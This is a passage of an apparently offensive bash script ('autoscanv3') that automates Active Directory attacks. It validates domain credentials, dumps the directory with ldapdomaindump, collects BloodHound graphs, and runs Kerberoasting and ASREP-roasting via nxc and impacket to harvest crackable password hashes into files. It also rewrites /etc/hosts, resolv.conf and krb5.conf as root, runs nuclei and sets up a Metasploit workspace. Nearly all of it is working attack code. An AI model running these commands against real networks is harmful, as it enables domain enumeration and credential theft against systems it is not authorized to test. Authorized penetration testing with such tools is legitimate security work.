        echo -e "${GREEN}✅ nmap: ${n} host(s) with SMB signing disabled/not required -> ${out}${NC}"
        echo -e "${CYAN}Raw nmap output: nmap-smb-signing.txt${NC}"
    else
        echo -e "${GREEN}No host with SMB signing disabled found.${NC}"
        rm -f "$out"
    fi
}

# LDAP Domain Dump function
ldap_domain_dump() {
    echo -e "${BOLD}${PURPLE}=== LDAP DOMAIN DUMP ===${NC}"

    if [[ "$LDAP_SKIP_DOWNSTREAM_LDAP_OPS" == "true" ]]; then
        echo -e "${YELLOW}Skipping LDAP domain dump (credentials not validated or user declined re-entry).${NC}"
        return 0
    fi

    # Check if p389.txt exists
    if [[ ! -f "p389.txt" ]]; then
        echo -e "${YELLOW}No LDAP servers found (p389.txt not found)${NC}"
        return 0
    fi

    # Check if LDAP credentials are provided
    if [[ -z "$LDAP_USERNAME" || -z "$LDAP_PASSWORD" || -z "$LDAP_DOMAIN" ]]; then
        echo -e "${YELLOW}LDAP credentials not provided. Skipping LDAP domain dump.${NC}"
        echo -e "${CYAN}Use -u username -p password -d domain to enable LDAP dump${NC}"
        return 0
    fi

    # Create ldapdomdump directory
    mkdir -p "ldapdomdump"
    echo -e "${GREEN}Created ldapdomdump directory${NC}"

    # Function to try LDAPS if LDAP fails
    try_ldaps() {
        local ldap_ip=$1
        echo -e "${YELLOW}LDAP failed, trying LDAPS (port 636)...${NC}"

        if [[ -f "p636.txt" && -s "p636.txt" ]]; then
            # Check if the same IP exists in p636.txt
            if grep -q "$ldap_ip" "p636.txt"; then
                echo -e "${CYAN}Found LDAPS server: $ldap_ip${NC}"
                echo -e "${YELLOW}Running LDAPS domain dump...${NC}"

                # Run ldapdomaindump with LDAPS
                ldapdomaindump ldaps://"$ldap_ip" -u "${LDAP_DOMAIN}\\${LDAP_USERNAME}" -p "${LDAP_PASSWORD}" -o "ldapdomdump" 2>/dev/null

                if [[ $? -eq 0 ]]; then
                    echo -e "${GREEN}✅ LDAPS domain dump completed successfully${NC}"
                    echo -e "${CYAN}Results saved to ldapdomdump/ directory${NC}"
                    return 0
                else
                    echo -e "${RED}❌ LDAPS domain dump also failed${NC}"
                    echo -e "${YELLOW}Continuing with next operations...${NC}"
                    return 1
                fi
            else
                echo -e "${YELLOW}IP $ldap_ip not found in LDAPS servers (p636.txt)${NC}"
                return 1
            fi
        else
            echo -e "${YELLOW}No LDAPS servers found (p636.txt not found)${NC}"
            return 1
        fi
    }

    # Read IP addresses from p389.txt
    ip_count=$(cat "p389.txt" | wc -l)

    if [[ $ip_count -eq 1 ]]; then
        # Single IP - use it directly
        ldap_ip=$(cat "p389.txt")
        echo -e "${CYAN}Found 1 LDAP server: $ldap_ip${NC}"
        echo -e "${YELLOW}Running LDAP domain dump...${NC}"

        # Run ldapdomaindump
        ldapdomaindump -u "${LDAP_DOMAIN}\\${LDAP_USERNAME}" -p "${LDAP_PASSWORD}" "$ldap_ip" -o "ldapdomdump" 2>/dev/null

        if [[ $? -eq 0 ]]; then
            echo -e "${GREEN}✅ LDAP domain dump completed successfully${NC}"
            echo -e "${CYAN}Results saved to ldapdomdump/ directory${NC}"
        else
            echo -e "${RED}❌ LDAP domain dump failed${NC}"
            not_interrupted || return 130
            # Try LDAPS as fallback
            if ! try_ldaps "$ldap_ip"; then
                echo -e "${YELLOW}Continuing with next operations...${NC}"
            fi
        fi

    elif [[ $ip_count -gt 1 ]]; then
        # Multiple IPs - try all automatically
        echo -e "${CYAN}Found $ip_count LDAP servers, trying all automatically...${NC}"

        # Display IPs
        counter=1
        while IFS= read -r ip; do
            if [[ -n "$ip" ]]; then
                echo -e "${WHITE}  $counter) $ip${NC}"
                ((counter++))
            fi
        done < "p389.txt"
        echo ""

        # Try each IP until one succeeds
        success=false
        while IFS= read -r ip; do
            if [[ -n "$ip" ]]; then
                not_interrupted || return 130
                echo -e "${YELLOW}Trying LDAP server: $ip${NC}"

                # Run ldapdomaindump
                ldapdomaindump -u "${LDAP_DOMAIN}\\${LDAP_USERNAME}" -p "${LDAP_PASSWORD}" "$ip" -o "ldapdomdump" 2>/dev/null

                if [[ $? -eq 0 ]]; then
                    echo -e "${GREEN}✅ LDAP domain dump completed successfully with $ip${NC}"
                    echo -e "${CYAN}Results saved to ldapdomdump/ directory${NC}"
                    success=true
                    break
                else
                    echo -e "${RED}❌ LDAP domain dump failed with $ip, trying LDAPS...${NC}"
                    # Try LDAPS as fallback
                    if try_ldaps "$ip"; then
                        success=true
                        break
                    fi
                fi
            fi
        done < "p389.txt"

        if [[ "$success" == false ]]; then
            echo -e "${RED}❌ All LDAP servers failed${NC}"
            echo -e "${YELLOW}Continuing with next operations...${NC}"
        fi
    else
        echo -e "${YELLOW}No LDAP servers found in p389.txt${NC}"
    fi
}

# Returns: 0 bind OK, 1 invalid credentials (on any DC), 2 no successful bind / unreachable
ldap_try_validate_bind_once() {
    local ip result any_invalid=0
    while IFS= read -r ip; do
        [[ -z "$ip" ]] && continue
        not_interrupted || return 2
        result=$(ldapwhoami -x -H "ldap://${ip}" -D "${LDAP_USERNAME}@${LDAP_DOMAIN}" -w "${LDAP_PASSWORD}" 2>&1)
        if echo "$result" | grep -q "^u:" && ! echo "$result" | grep -q "ldap_bind\|ldap_sasl_bind\|Can't contact"; then
            return 0
        fi
        if echo "$result" | grep -qi "Invalid credentials"; then
            any_invalid=1
        fi
        if [[ -f "p636.txt" && -s "p636.txt" ]] && grep -Fxq "$ip" "p636.txt"; then
            result=$(LDAPTLS_REQCERT=never ldapwhoami -x -H "ldaps://${ip}" -D "${LDAP_USERNAME}@${LDAP_DOMAIN}" -w "${LDAP_PASSWORD}" 2>&1)
            if echo "$result" | grep -q "^u:" && ! echo "$result" | grep -q "ldap_bind\|ldap_sasl_bind\|Can't contact"; then
                return 0
            fi
            if echo "$result" | grep -qi "Invalid credentials"; then
                any_invalid=1
            fi
        fi
    done < "p389.txt"
    [[ "$any_invalid" -eq 1 ]] && return 1
    return 2
}

# After DC/LDAP targets exist: validate -u/-p/-d before ldapdomaindump and BloodHound
ldap_credentials_validation_gate() {
    echo -e "${BOLD}${PURPLE}=== LDAP CREDENTIAL VALIDATION ===${NC}"
    LDAP_SKIP_DOWNSTREAM_LDAP_OPS=false

    if ! command -v ldapwhoami &> /dev/null; then
        echo -e "${YELLOW}ldapwhoami not found (install ldap-utils). Cannot validate credentials; skipping ldapdomaindump and BloodHound.${NC}"
        LDAP_SKIP_DOWNSTREAM_LDAP_OPS=true
        return 0
    fi

    if [[ ! -f "p389.txt" || ! -s "p389.txt" ]]; then
        echo -e "${YELLOW}No LDAP (389) targets in p389.txt — credential validation not needed.${NC}"
        return 0
    fi

    if [[ -z "$LDAP_USERNAME" || -z "$LDAP_PASSWORD" || -z "$LDAP_DOMAIN" ]]; then
        echo -e "${YELLOW}No LDAP credentials provided (-u / -p / -d). ldapdomaindump and BloodHound will be skipped.${NC}"
        return 0
    fi

    while true; do
        not_interrupted || return 130
        ldap_try_validate_bind_once
        rc=$?
        if [[ $rc -eq 0 ]]; then
            echo -e "${GREEN}Credentials validated. Proceeding with LDAP-related steps.${NC}"
            LDAP_SKIP_DOWNSTREAM_LDAP_OPS=false
            return 0
        fi

        not_interrupted || return 130

        if [[ $rc -eq 1 ]]; then
            echo -e "${RED}The username or password you entered is incorrect.${NC}"
        else
            echo -e "${RED}Could not connect to LDAP on any address in p389.txt (or no successful bind).${NC}"
        fi

        while true; do
            read -r -p "Do you want to enter credentials again? [y/n]: " yn
            not_interrupted || return 130
            case "$yn" in
                y|Y)
                    echo ""
                    read -r -p "Username: " LDAP_USERNAME
                    read -r -s -p "Password: " LDAP_PASSWORD
                    echo ""
                    read -r -p "Domain: " LDAP_DOMAIN
                    echo ""
                    break 2
                    ;;
                n|N)
                    echo -e "${YELLOW}Skipping ldapdomaindump and BloodHound.${NC}"
                    LDAP_SKIP_DOWNSTREAM_LDAP_OPS=true
                    return 0
                    ;;
                *)
                    echo -e "${YELLOW}Please enter y or n.${NC}"
                    ;;
            esac
        done
    done
}

# BloodHound CE Python function (also supports nxc fallback)
bloodhound_dump() {
    echo -e "${BOLD}${PURPLE}=== BLOODHOUND CE PYTHON ===${NC}"

    if [[ "$LDAP_SKIP_DOWNSTREAM_LDAP_OPS" == "true" ]]; then
        echo -e "${YELLOW}Skipping BloodHound CE Python (credentials not validated or user declined re-entry).${NC}"
        return 0
    fi

    # Check if p389.txt exists
    if [[ ! -f "p389.txt" ]]; then
        echo -e "${YELLOW}No LDAP servers found (p389.txt not found)${NC}"
        return 0
    fi

    # Check if BloodHound credentials are provided
    if [[ -z "$LDAP_USERNAME" || -z "$LDAP_PASSWORD" || -z "$LDAP_DOMAIN" ]]; then
        echo -e "${YELLOW}BloodHound credentials not provided. Skipping BloodHound dump.${NC}"
        echo -e "${CYAN}Use -u username -p password -d domain to enable BloodHound dump${NC}"
        return 0
    fi

    # Function to try LDAPS and nxc as fallbacks if BloodHound CE fails
    try_bloodhound_fallbacks() {
        local ldap_ip=$1

        # --- Fallback 1: bloodhound-ce-python with LDAPS ---
        echo -e "${YELLOW}BloodHound CE failed, trying with LDAPS (port 636)...${NC}"

        if [[ -f "p636.txt" && -s "p636.txt" ]]; then
            if grep -q "$ldap_ip" "p636.txt"; then
                echo -e "${CYAN}Found LDAPS server: $ldap_ip${NC}"
                echo -e "${YELLOW}Running BloodHound CE Python with LDAPS...${NC}"

                bloodhound-ce-python -u "$LDAP_USERNAME" -p "$LDAP_PASSWORD" -ns "$ldap_ip" -d "$LDAP_DOMAIN" -c All --use-ldaps --zip 2>/dev/null

                if [[ $? -eq 0 ]]; then
                    echo -e "${GREEN}✅ BloodHound CE Python with LDAPS completed successfully${NC}"
                    echo -e "${CYAN}Results saved as ZIP file in current directory${NC}"
                    return 0
                else
                    echo -e "${RED}❌ BloodHound CE Python with LDAPS also failed${NC}"
                fi
            else
                echo -e "${YELLOW}IP $ldap_ip not found in LDAPS servers (p636.txt)${NC}"
            fi
        else
            echo -e "${YELLOW}No LDAPS servers found (p636.txt not found)${NC}"
        fi

        not_interrupted || return 1

        # --- Fallback 2: nxc (netexec) ldap bloodhound ---
        if command -v nxc &> /dev/null; then
            echo -e "${YELLOW}Trying nxc (netexec) LDAP BloodHound collection...${NC}"

            nxc ldap "$ldap_ip" -u "$LDAP_USERNAME" -p "$LDAP_PASSWORD" -d "$LDAP_DOMAIN" --bloodhound -c All 2>/dev/null

            if [[ $? -eq 0 ]]; then
                echo -e "${GREEN}✅ nxc BloodHound collection completed successfully${NC}"
                echo -e "${CYAN}Results saved by nxc in current directory${NC}"
                return 0
            else
                echo -e "${RED}❌ nxc BloodHound collection also failed${NC}"

                # Try nxc with LDAPS
                if [[ -f "p636.txt" && -s "p636.txt" ]] && grep -q "$ldap_ip" "p636.txt"; then
                    echo -e "${YELLOW}Trying nxc LDAPS BloodHound collection (port 636)...${NC}"
                    nxc ldap "$ldap_ip" --port 636 -u "$LDAP_USERNAME" -p "$LDAP_PASSWORD" -d "$LDAP_DOMAIN" --bloodhound -c All 2>/dev/null

                    if [[ $? -eq 0 ]]; then
                        echo -e "${GREEN}✅ nxc LDAPS BloodHound collection completed successfully${NC}"
                        echo -e "${CYAN}Results saved by nxc in current directory${NC}"
                        return 0
                    else
                        echo -e "${RED}❌ nxc LDAPS BloodHound collection also failed${NC}"
                    fi
                fi
            fi
        else
            echo -e "${YELLOW}nxc (netexec) not installed. Skipping nxc BloodHound fallback.${NC}"
        fi

        echo -e "${YELLOW}All BloodHound fallbacks exhausted.${NC}"
        return 1
    }

    # Read IP addresses from p389.txt
    ip_count=$(cat "p389.txt" | wc -l)

    if [[ $ip_count -eq 1 ]]; then
        # Single IP - use it directly
        ldap_ip=$(cat "p389.txt")
        echo -e "${CYAN}Found 1 LDAP server: $ldap_ip${NC}"

        # --- Primary: bloodhound-ce-python (LDAP) ---
        echo -e "${YELLOW}Running BloodHound CE Python...${NC}"
        bloodhound-ce-python -u "$LDAP_USERNAME" -p "$LDAP_PASSWORD" -ns "$ldap_ip" -d "$LDAP_DOMAIN" -c All --zip 2>/dev/null

        if [[ $? -eq 0 ]]; then
            echo -e "${GREEN}✅ BloodHound CE Python completed successfully${NC}"
            echo -e "${CYAN}Results saved as ZIP file in current directory${NC}"
        else
            echo -e "${RED}❌ BloodHound CE Python failed${NC}"
            not_interrupted || return 130
            if ! try_bloodhound_fallbacks "$ldap_ip"; then
                echo -e "${YELLOW}Continuing with next operations...${NC}"
            fi
        fi

    elif [[ $ip_count -gt 1 ]]; then
        # Multiple IPs - try all automatically
        echo -e "${CYAN}Found $ip_count LDAP servers, trying all automatically...${NC}"

        # Display IPs
        counter=1
        while IFS= read -r ip; do
            if [[ -n "$ip" ]]; then
                echo -e "${WHITE}  $counter) $ip${NC}"
                ((counter++))
            fi
        done < "p389.txt"
        echo ""

        # Try each IP until one succeeds
        success=false
        while IFS= read -r ip; do
            if [[ -n "$ip" ]]; then
                not_interrupted || return 130
                echo -e "${YELLOW}Trying BloodHound CE with LDAP server: $ip${NC}"

                # --- Primary: bloodhound-ce-python (LDAP) ---
                bloodhound-ce-python -u "$LDAP_USERNAME" -p "$LDAP_PASSWORD" -ns "$ip" -d "$LDAP_DOMAIN" -c All --zip 2>/dev/null

                if [[ $? -eq 0 ]]; then
                    echo -e "${GREEN}✅ BloodHound CE Python completed successfully with $ip${NC}"
                    echo -e "${CYAN}Results saved as ZIP file in current directory${NC}"
                    success=true
                    break
                else
                    echo -e "${RED}❌ BloodHound CE Python failed with $ip${NC}"
                    if try_bloodhound_fallbacks "$ip"; then
                        success=true
                        break
                    fi
                fi
            fi
        done < "p389.txt"

        if [[ "$success" == false ]]; then
            echo -e "${RED}❌ All BloodHound attempts failed${NC}"
            echo -e "${YELLOW}Continuing with next operations...${NC}"
        fi
    else
        echo -e "${YELLOW}No LDAP servers found in p389.txt${NC}"
    fi
}

# Kerberos Implementation function
kerberos_implementation() {
    echo -e "${BOLD}${BLUE}=== KERBEROS IMPLEMENTATION ===${NC}"
    echo -e "${YELLOW}Automating /etc/hosts, /etc/resolv.conf, and /etc/krb5.conf configuration...${NC}"
    echo ""

    # --- Root check ---
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}Error: Kerberos implementation requires root privileges.${NC}"
        echo -e "${YELLOW}Please run the script with sudo.${NC}"
        return 1
    fi

    # --- Determine IP source ---
    # Prefer verified DCs from p389.txt, fall back to input IP file
    local ip_source=""
    if [[ -f "p389.txt" && -s "p389.txt" ]]; then
        ip_source="p389.txt"
        echo -e "${GREEN}Using verified DC IPs from p389.txt${NC}"
    elif [[ -n "$IP_FILE" && -f "$IP_FILE" && -s "$IP_FILE" ]]; then
        ip_source="$IP_FILE"
        echo -e "${YELLOW}p389.txt not found, falling back to input IP file: $IP_FILE${NC}"
    else
        echo -e "${RED}Error: No IP source available (neither p389.txt nor an input IP file).${NC}"
        return 1
    fi

    # --- Read and validate IPs ---
    local IPS=()
    while IFS= read -r ip; do
        # Skip empty lines and comments
        [[ -z "$ip" || "$ip" =~ ^[[:space:]]*# ]] && continue
        # Validate IP format (also handle CIDR by stripping the mask for validation)
        local ip_clean=$(echo "$ip" | cut -d '/' -f 1)
        if [[ "$ip_clean" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            IPS+=("$ip_clean")
        fi
    done < "$ip_source"

    if [[ ${#IPS[@]} -eq 0 ]]; then
        echo -e "${RED}Error: No valid IP addresses found in $ip_source${NC}"
        return 1
    fi

    echo -e "${CYAN}Found ${#IPS[@]} IP(s) for Kerberos configuration:${NC}"
    for ip in "${IPS[@]}"; do
        echo -e "  ${WHITE}$ip${NC}"
    done
    echo ""

    # --- Domain input ---
    local DOMAIN_NAME=""
    if [[ -n "$LDAP_DOMAIN" ]]; then
        echo -e "${CYAN}Using domain from -d parameter: ${WHITE}$LDAP_DOMAIN${NC}"
        DOMAIN_NAME="$LDAP_DOMAIN"
    else
        read -r -p "Please enter the target domain name (e.g., corp.local): " DOMAIN_NAME
        not_interrupted || return 130
        if [[ -z "$DOMAIN_NAME" ]]; then
            echo -e "${RED}Error: Domain name cannot be empty.${NC}"
            return 1
        fi
    fi

    local UPPERCASE_DOMAIN=$(echo "$DOMAIN_NAME" | tr '[:lower:]' '[:upper:]')
    echo -e "${CYAN}Domain: ${WHITE}$DOMAIN_NAME${NC}"
    echo -e "${CYAN}Kerberos Realm: ${WHITE}$UPPERCASE_DOMAIN${NC}"
    echo ""

    # --- Backup existing files ---
    echo -e "${YELLOW}Creating backups of existing configuration files...${NC}"
    if [[ -f /etc/hosts ]]; then
        cp /etc/hosts /etc/hosts.bak
        echo -e "  ${GREEN}/etc/hosts -> /etc/hosts.bak${NC}"
    fi
    if [[ -f /etc/resolv.conf ]]; then
        cp /etc/resolv.conf /etc/resolv.conf.bak
        echo -e "  ${GREEN}/etc/resolv.conf -> /etc/resolv.conf.bak${NC}"
    fi
    if [[ -f /etc/krb5.conf ]]; then
        cp /etc/krb5.conf /etc/krb5.conf.bak
        echo -e "  ${GREEN}/etc/krb5.conf -> /etc/krb5.conf.bak${NC}"
    fi
    echo ""

    # --- Configure /etc/hosts ---
    echo -e "${YELLOW}Configuring /etc/hosts...${NC}"
    echo "" > /etc/hosts
    echo "# hosts file reconfigured by autoscanv3 - $(date)" >> /etc/hosts
    echo "127.0.0.1       localhost" >> /etc/hosts
    echo "127.0.1.1       kali" >> /etc/hosts

    for ip in "${IPS[@]}"; do
        echo "$ip    dc.${DOMAIN_NAME}" >> /etc/hosts
    done
    echo -e "${GREEN}/etc/hosts configured successfully.${NC}"
    echo ""

    # --- Configure /etc/resolv.conf ---
    echo -e "${YELLOW}Configuring /etc/resolv.conf...${NC}"
    echo "" > /etc/resolv.conf
    echo "# resolv.conf reconfigured by autoscanv3 - $(date)" >> /etc/resolv.conf
    echo "domain $DOMAIN_NAME" >> /etc/resolv.conf
    echo "search $DOMAIN_NAME" >> /etc/resolv.conf

    for ip in "${IPS[@]}"; do
        echo "nameserver $ip" >> /etc/resolv.conf
    done
    echo -e "${GREEN}/etc/resolv.conf configured successfully.${NC}"
    echo ""

    # --- Configure /etc/krb5.conf ---
    echo -e "${YELLOW}Configuring /etc/krb5.conf...${NC}"
    echo "" > /etc/krb5.conf
    echo "# krb5.conf reconfigured by autoscanv3 - $(date)" >> /etc/krb5.conf
    echo "[libdefaults]" >> /etc/krb5.conf
    echo "    default_realm = $UPPERCASE_DOMAIN" >> /etc/krb5.conf
    echo "    dns_lookup_realm = false" >> /etc/krb5.conf
    echo "    dns_lookup_kdc = false" >> /etc/krb5.conf
    echo "    ticket_lifetime = 24h" >> /etc/krb5.conf
    echo "    forwardable = true" >> /etc/krb5.conf
    echo "" >> /etc/krb5.conf
    echo "[realms]" >> /etc/krb5.conf
    echo "    $UPPERCASE_DOMAIN = {" >> /etc/krb5.conf

    for ip in "${IPS[@]}"; do
        echo "        kdc = $ip" >> /etc/krb5.conf
    done

    for ip in "${IPS[@]}"; do
        echo "        admin_server = $ip" >> /etc/krb5.conf
    done

    echo "        default_domain = $DOMAIN_NAME" >> /etc/krb5.conf
    echo "    }" >> /etc/krb5.conf
    echo "" >> /etc/krb5.conf
    echo "[domain_realm]" >> /etc/krb5.conf
    echo "    .$DOMAIN_NAME = $UPPERCASE_DOMAIN" >> /etc/krb5.conf
    echo "    $DOMAIN_NAME = $UPPERCASE_DOMAIN" >> /etc/krb5.conf
    echo -e "${GREEN}/etc/krb5.conf configured successfully.${NC}"
    echo ""

    # --- Summary ---
    echo -e "${BOLD}${GREEN}=== KERBEROS CONFIGURATION COMPLETE ===${NC}"
    echo -e "${CYAN}Domain:${NC}        $DOMAIN_NAME"
    echo -e "${CYAN}Realm:${NC}         $UPPERCASE_DOMAIN"
    echo -e "${CYAN}KDC/Admin Servers:${NC}"
    for ip in "${IPS[@]}"; do
        echo -e "                  $ip"
    done
    echo ""
    echo -e "${YELLOW}Backups created with .bak extension. Use them to restore if needed:${NC}"
    echo -e "  /etc/hosts.bak"
    echo -e "  /etc/resolv.conf.bak"
    echo -e "  /etc/krb5.conf.bak"
    echo ""
    echo -e "${GREEN}Kerberos implementation completed successfully!${NC}"
}

# Kerberoasting and ASREP-roasting function
kerberoasting_asreproasting() {
    echo -e "${BOLD}${PURPLE}=== KERBEROASTING & ASREP-ROASTING ===${NC}"

    if [[ "$LDAP_SKIP_DOWNSTREAM_LDAP_OPS" == "true" ]]; then
        echo -e "${YELLOW}Skipping roasting (credentials not validated or user declined re-entry).${NC}"
        return 0
    fi

    if [[ -z "$LDAP_USERNAME" || -z "$LDAP_PASSWORD" || -z "$LDAP_DOMAIN" ]]; then
        echo -e "${YELLOW}Credentials not provided. Skipping kerberoasting/ASREP-roasting.${NC}"
        return 0
    fi

    if [[ ! -f "p389.txt" || ! -s "p389.txt" ]]; then
        echo -e "${YELLOW}No DC IPs in p389.txt. Cannot run roasting.${NC}"
        return 0
    fi

    # Create kerberos output directory
    mkdir -p "kerberos"
    echo -e "${GREEN}Created kerberos/ directory for roasting output${NC}"

    local dcip
    dcip=$(head -n1 p389.txt)
    echo -e "${CYAN}Using DC: ${dcip}${NC}"
    echo ""

    # --- Kerberoasting ---
    echo -e "${BOLD}${YELLOW}[1/2] Kerberoasting${NC}"

    local kerb_nxc_ok=false
    if command -v nxc &> /dev/null; then
        echo -e "${YELLOW}Running nxc kerberoasting...${NC}"
        nxc ldap "$dcip" -u "$LDAP_USERNAME" -p "$LDAP_PASSWORD" -d "$LDAP_DOMAIN" --kerberoasting "kerberos/kerbout.txt" 2>/dev/null
        if [[ $? -eq 0 ]]; then
            if [[ -s "kerberos/kerbout.txt" ]]; then
                local kerb_count=$(wc -l < "kerberos/kerbout.txt")
                echo -e "${GREEN}✅ nxc kerberoasting: ${kerb_count} hash(es) -> kerberos/kerbout.txt${NC}"
                kerb_nxc_ok=true
            else
                echo -e "${YELLOW}nxc kerberoasting: no hashes found${NC}"
            fi
        else
            echo -e "${RED}❌ nxc kerberoasting failed${NC}"
        fi
    else
        echo -e "${YELLOW}nxc not installed, skipping nxc kerberoasting${NC}"
    fi

    not_interrupted || return 130

    # impacket kerberoasting fallback
    if [[ "$kerb_nxc_ok" == "false" ]] && command -v impacket-GetUserSPNs &> /dev/null; then
        echo -e "${YELLOW}Trying impacket-GetUserSPNs...${NC}"
        impacket-GetUserSPNs -request -dc-ip "$dcip" "${LDAP_DOMAIN}/${LDAP_USERNAME}:${LDAP_PASSWORD}" -outputfile "kerberos/kerberoasting.hashes" 2>/dev/null
        if [[ $? -eq 0 ]] && [[ -f "kerberos/kerberoasting.hashes" ]]; then
            echo -e "${GREEN}✅ impacket kerberoasting -> kerberos/kerberoasting.hashes${NC}"
        else
            echo -e "${RED}❌ impacket kerberoasting also failed${NC}"
        fi
    fi
    echo ""

    not_interrupted || return 130

    # --- ASREP-roasting ---
    echo -e "${BOLD}${YELLOW}[2/2] ASREP-roasting${NC}"

    local asrep_nxc_ok=false
    if command -v nxc &> /dev/null; then
        echo -e "${YELLOW}Running nxc ASREP-roasting...${NC}"
        nxc ldap "$dcip" -u "$LDAP_USERNAME" -p "$LDAP_PASSWORD" -d "$LDAP_DOMAIN" --asreproast "kerberos/asrepout.txt" 2>/dev/null
        if [[ $? -eq 0 ]]; then
            if [[ -s "kerberos/asrepout.txt" ]]; then
                local asrep_count=$(wc -l < "kerberos/asrepout.txt")
                echo -e "${GREEN}✅ nxc ASREP-roasting: ${asrep_count} hash(es) -> kerberos/asrepout.txt${NC}"
                asrep_nxc_ok=true
            else
                echo -e "${YELLOW}nxc ASREP-roasting: no hashes found (may require users without preauth)${NC}"
            fi
        else
            echo -e "${RED}❌ nxc ASREP-roasting failed${NC}"
        fi
    else
        echo -e "${YELLOW}nxc not installed, skipping nxc ASREP-roasting${NC}"
    fi

    # impacket ASREP-roasting notes
    if [[ "$asrep_nxc_ok" == "false" ]]; then
        echo -e "${CYAN}For impacket ASREP-roasting against users without preauth, run manually:${NC}"
        echo -e "  ${WHITE}impacket-GetNPUsers ${LDAP_DOMAIN}/ -dc-ip ${dcip} -no-pass${NC}"
    fi
    echo ""

    echo -e "${GREEN}Kerberoasting & ASREP-roasting complete. Output in kerberos/ directory.${NC}"
}

# Nuclei scan prompt
nuclei_scan_prompt() {
    if [[ ! -f "all-webs.txt" || ! -s "all-webs.txt" ]]; then
        echo -e "${YELLOW}No web URLs in all-webs.txt, skipping nuclei scan.${NC}"
        return 0
    fi

    echo ""
    echo -e "${BOLD}${PURPLE}=== NUCLEI SCAN ===${NC}"
    read -r -p "Run nuclei against all-webs.txt? [y/n]: " yn
    not_interrupted || return 130
    case "$yn" in
        y|Y)
            if ! command -v nuclei &> /dev/null; then
                echo -e "${RED}nuclei is not installed. Install it and try again.${NC}"
                return 1
            fi
            echo -e "${YELLOW}Starting nuclei scan on all-webs.txt...${NC}"
            local nuclei_count=$(wc -l < "all-webs.txt")
            echo -e "${CYAN}Targets: ${nuclei_count} URLs${NC}"
            nuclei -l all-webs.txt -o nuclei-results.txt 2>/dev/null
            local nuclei_rc=$?
            not_interrupted || return 130
            if [[ $nuclei_rc -eq 0 ]]; then
                if [[ -s "nuclei-results.txt" ]]; then
                    local result_count=$(wc -l < "nuclei-results.txt")
                    echo -e "${GREEN}✅ Nuclei scan completed with ${result_count} finding(s)${NC}"
                    echo -e "${CYAN}Results saved to nuclei-results.txt${NC}"
                else
                    echo -e "${GREEN}✅ Nuclei scan completed — no findings${NC}"
                fi
            else
                echo -e "${RED}❌ Nuclei scan failed${NC}"
            fi
            ;;
        n|N)
            echo -e "${YELLOW}Skipping nuclei scan.${NC}"
            ;;
        *)
            echo -e "${YELLOW}Invalid input, skipping nuclei scan.${NC}"
            ;;
    esac
}

# Keep names safe for shell/msf command strings
sanitize_name() {
    printf '%s' "$1" | tr -c 'A-Za-z0-9._-' '_'
}

# Metasploit: database check + workspace named after the project
metasploit_setup() {
    echo ""
    echo -e "${BOLD}${PURPLE}=== METASPLOIT DATABASE & WORKSPACE ===${NC}"

    if [[ "$MSF_SKIP" == "true" ]]; then
        echo -e "${YELLOW}--no-msf given: skipping Metasploit setup.${NC}"
        return 0
    fi

    if ! command -v msfconsole &> /dev/null; then
        echo -e "${YELLOW}msfconsole not installed. Skipping Metasploit setup.${NC}"
        return 0
    fi

    # --- Project name (asked up front) ---
    if [[ -z "$MSF_PROJECT" ]]; then
        if tty_available; then
            local ans=""
            read -r -p "Project name (used as the Metasploit workspace): " ans < /dev/tty
            MSF_PROJECT="$ans"
        fi
    fi
    not_interrupted || return 130

    if [[ -z "$MSF_PROJECT" ]]; then
        echo -e "${YELLOW}No project name given (use --project <name>). Skipping workspace creation.${NC}"
        return 0
    fi

    MSF_PROJECT=$(sanitize_name "$MSF_PROJECT")
    echo -e "${CYAN}Project / workspace:${NC} ${WHITE}${MSF_PROJECT}${NC}"

    # --- Database check ---
    echo -e "${YELLOW}Checking Metasploit database status (this can take a few seconds)...${NC}"
    local db_out
    db_out=$(msfconsole -q -x "db_status; exit" 2>&1)
    not_interrupted || return 130

    if ! echo "$db_out" | grep -qi "connected to"; then
        echo -e "${RED}❌ Metasploit is not connected to a database.${NC}"
        echo "$db_out" | grep -i "postgresql\|database" | tail -n 2

        if command -v msfdb &> /dev/null; then
            echo -e "${YELLOW}Trying to start the database (msfdb start)...${NC}"
            if [[ $EUID -eq 0 ]]; then
                msfdb start > /dev/null 2>&1
            else
                sudo msfdb start > /dev/null 2>&1
            fi
        elif command -v systemctl &> /dev/null; then
            echo -e "${YELLOW}Trying to start postgresql...${NC}"
            if [[ $EUID -eq 0 ]]; then
                systemctl start postgresql > /dev/null 2>&1
            else
                sudo systemctl start postgresql > /dev/null 2>&1
            fi
        fi

        not_interrupted || return 130
        db_out=$(msfconsole -q -x "db_status; exit" 2>&1)
    fi

    if echo "$db_out" | grep -qi "connected to"; then
        echo -e "${GREEN}✅ Metasploit database is connected${NC}"
    else
        echo -e "${RED}❌ Still no database connection.${NC}"
        echo -e "${YELLOW}Initialise it manually with: ${WHITE}sudo msfdb init${NC}"
        echo -e "${YELLOW}Skipping workspace creation.${NC}"
        return 0
    fi

    # --- Workspace ---
    echo -e "${YELLOW}Creating/selecting workspace '${MSF_PROJECT}'...${NC}"
    msfconsole -q -x "workspace -a ${MSF_PROJECT}; workspace ${MSF_PROJECT}; workspace; exit" > "msf-workspace.log" 2>&1
    not_interrupted || return 130

    if grep -q "${MSF_PROJECT}" "msf-workspace.log" 2>/dev/null; then
        echo -e "${GREEN}✅ Workspace ready: ${MSF_PROJECT}${NC}"
        MSF_WORKSPACE_READY=true
    else
        echo -e "${YELLOW}Could not confirm the workspace — see msf-workspace.log${NC}"
    fi

    if [[ -f "$STATE_FILE" ]] && ! grep -q "^MSF_WORKSPACE=" "$STATE_FILE"; then
        echo "MSF_WORKSPACE=${MSF_PROJECT}" >> "$STATE_FILE"
    fi

    echo -e "${CYAN}Use it later with:${NC} ${WHITE}msfconsole -q -x \"workspace ${MSF_PROJECT}\"${NC}"
}

# sam-names.txt + high-priv-accounts.txt from the ldapdomaindump JSON files
build_user_lists() {
    echo ""
    echo -e "${BOLD}${PURPLE}=== USER LISTS (sam-names.txt / high-priv-accounts.txt) ===${NC}"

    local udump="" gdump=""
    if [[ -f "ldapdomdump/domain_users.json" ]]; then
        udump="ldapdomdump/domain_users.json"
    else
        udump=$(ls -1 ldapdomdump/*users*.json 2>/dev/null | head -n 1)
    fi
    if [[ -f "ldapdomdump/domain_groups.json" ]]; then
        gdump="ldapdomdump/domain_groups.json"
    else
        gdump=$(ls -1 ldapdomdump/*groups*.json 2>/dev/null | head -n 1)
    fi

    local hp_tmp
    hp_tmp=$(mktemp)

